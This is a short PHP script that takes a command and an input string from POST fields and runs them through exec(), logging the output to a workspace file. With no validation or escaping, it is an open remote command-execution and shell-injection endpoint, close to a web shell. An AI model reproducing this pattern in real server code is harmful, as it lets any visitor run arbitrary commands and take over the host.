<?php
$script = $_POST["script"];
$input = $_POST["input"];
echo exec("echo '$input' | $script >& ../../WORKSPACE/log.txt");
?>
